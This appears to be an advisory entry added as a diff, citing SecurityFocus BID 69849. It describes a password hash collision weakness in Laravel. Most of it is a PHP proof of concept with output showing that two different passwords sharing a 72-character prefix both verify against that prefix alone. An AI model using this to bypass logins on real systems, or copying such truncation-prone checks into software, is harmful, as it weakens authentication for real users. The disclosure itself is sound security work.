@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/69849/info
+
+Laravel is prone to a security weakness due to pseudo password hash collision.
+
+Attackers can exploit this issue to bypass intended security restrictions. This may aid in further attacks. 
+
+// user input password
+$input = str_repeat('A',72);
+// plaintext password
+$pass1 =
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.'mysupersecretpassword';
+$pass2 =
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.'longcatishere';
+// hashed password
+$hash1 = Hash::make($pass1);
+$hash2 = Hash::make($pass2);
+// match?
+$status1 = Hash::check($input, $hash1)?'Yes':'No';
+$status2 = Hash::check($input, $hash2)?'Yes':'No';
+
+User 1
+Desc. Value
+$input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$pass1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAmysupersecretpassword
+Hash::make($pass1)
+$2y$10$9oMcpTwHgTzR5ZUMqlnMMOx/P18QZ5e9054lq.pwxw1O9urX3JHHu
+Hash::check($input, $hash1) Yes
+
+User 2
+Desc. Value
+$input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$pass2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlongcatishere
+Hash::make($pass2)
+$2y$10$W7wwB4nLmFjrenJGmx1uauqhjzikZNZA0qzxH8wkbiSmVatCYrAUm
+Hash::check($input, $hash2) Yes
